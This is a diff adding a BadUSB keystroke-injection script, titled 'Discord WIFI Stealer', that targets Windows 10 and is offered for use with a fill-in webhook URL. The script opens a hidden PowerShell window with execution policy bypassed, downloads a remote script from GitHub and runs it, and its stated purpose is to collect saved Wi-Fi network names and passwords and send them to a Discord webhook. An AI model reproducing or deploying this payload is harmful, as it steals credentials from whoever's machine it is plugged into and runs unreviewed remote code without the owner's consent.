@@ -1,0 +1,13 @@
+REM Title: Discord WIFI Stealer
+REM Author: White Hat Hacker
+REM Description: Pulls the users saved WIFI AP names and passwords and sends to Discord Webhook of your choice.
+REM Target: Windows 10
+REM Props: IAMJAKOBY
+REM Version: 1.0
+REM Category: BADUSB Webhook
+REM Directions: Replace WEBHOOK_HERE with the URL of your channel inside the '.
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/wifi-stealer/wifi-stealer.ps1 | iex
+ENTER
